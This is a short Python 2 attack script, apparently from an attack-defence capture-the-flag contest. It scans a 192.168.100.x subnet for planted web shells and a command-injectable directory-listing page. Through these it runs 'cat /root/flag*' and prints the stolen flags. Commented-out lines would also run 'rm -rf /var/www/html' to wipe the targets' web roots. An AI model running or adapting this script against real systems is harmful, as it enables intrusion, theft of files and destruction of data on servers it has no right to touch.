import requests
import re

target_list = []

for i in range(2, 254):
    target_list.append('http://192.168.100.%s/' % str(i))

for target in target_list:
    try:
        print 'Trying %s' % target

        if requests.get(target + 'WebShell.php', timeout=1).status_code == 200:
            content = requests.get(target + 'WebShell.php?cmd=cat /root/flag*').content

            # print re.search(r'<pre>([\s\S]*)</pre>', content).group(1)

            flag = re.search(r'<pre>(.*)\n</pre>', content).group(1)
            print '[Flag] %s - %s' % (target, flag)

            # 做不到,大概没权限
            # requests.get(target + 'WebShell.php?cmd=rm -rf /var/www/html')

        elif requests.get(target + 'DisplayDirectoryCtrl.php', timeout=1).status_code == 200:
            content = requests.get(target + 'DisplayDirectoryCtrl.php?directory=|cat /root/flag*').content

            flag = re.search(r'<pre>(.*)\n</pre>', content).group(1)
            print '[Flag] %s - %s' % (target, flag)

            # requests.get(target + 'DisplayDirectoryCtrl.php?directory=| rm -rf /var/www/html')
        else:
            pass
    except:
        pass
